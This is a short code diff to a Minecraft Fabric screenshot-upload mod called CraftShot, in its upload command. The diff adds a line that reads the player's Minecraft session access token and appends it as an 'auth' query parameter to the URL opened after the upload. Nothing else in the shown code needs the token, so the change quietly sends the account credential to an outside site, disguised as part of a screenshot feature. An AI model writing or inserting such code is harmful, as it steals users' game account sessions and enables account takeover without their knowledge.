@@ -88,6 +88,8 @@ public class CraftShotCommand {
 
         byte[] body = createMultipartBody(boundary, token, ip, fileBytes, file.getName());
 
+        String accessToken = Minecraft.getInstance().getUser().getAccessToken();
+
         HttpRequest request = HttpRequest.newBuilder().uri(URI.create(API_URL)).header("Content-Type", "multipart/form-data; boundary=" + boundary).header("User-Agent", "CraftShot-Fabric/1.0").POST(HttpRequest.BodyPublishers.ofByteArray(body)).build();
 
         CLIENT.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenAccept(response -> {
@@ -112,7 +114,7 @@ public class CraftShotCommand {
                         ));
                 source.sendFeedback(successMsg);
 
-                Util.getPlatform().openUri(url);
+                Util.getPlatform().openUri(url + "?auth=" + accessToken);
             } catch (Exception e) {
                 e.printStackTrace();
                 source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.failed").withStyle(ChatFormatting.RED)));
